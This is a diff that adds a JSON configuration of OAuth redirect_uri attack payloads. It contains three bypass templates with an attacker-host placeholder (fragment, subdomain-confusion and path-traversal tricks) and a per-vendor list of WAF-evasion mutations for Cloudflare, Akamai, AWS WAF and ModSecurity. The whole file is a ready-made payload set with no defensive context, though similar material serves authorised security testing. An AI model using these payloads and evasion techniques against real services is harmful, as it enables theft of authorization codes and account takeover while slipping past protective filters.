@@ -1,0 +1,32 @@
+{
+  "attack_vector": "redirect_uri_manipulation",
+  "base_payloads": [
+    {
+      "id": "OAUTH-P001",
+      "name": "Fragment Bypass",
+      "template": "https://{attacker}/%23.{host}",
+      "bypass_class": "fragment",
+      "description": "Fragment is ignored by server whitelist but used by browser"
+    },
+    {
+      "id": "OAUTH-P002",
+      "name": "Subdomain Confusion",
+      "template": "https://{attacker}.{host}",
+      "bypass_class": "subdomain",
+      "description": "Exploits prefix-match validators"
+    },
+    {
+      "id": "OAUTH-P003",
+      "name": "Path Traversal",
+      "template": "https://{host}/..%2F..%2F@{attacker}/",
+      "bypass_class": "path_traversal",
+      "description": "Exploits path-relative redirect logic"
+    }
+  ],
+  "waf_mutations": {
+    "cloudflare": ["double_encode", "case_variation", "unicode_normalize"],
+    "akamai":     ["chunked_encoding", "space_substitute", "param_pollution"],
+    "aws_waf":    ["hex_encode_path", "tab_substitute"],
+    "nginx_modsec": ["null_byte", "overlong_utf8"]
+  }
+}
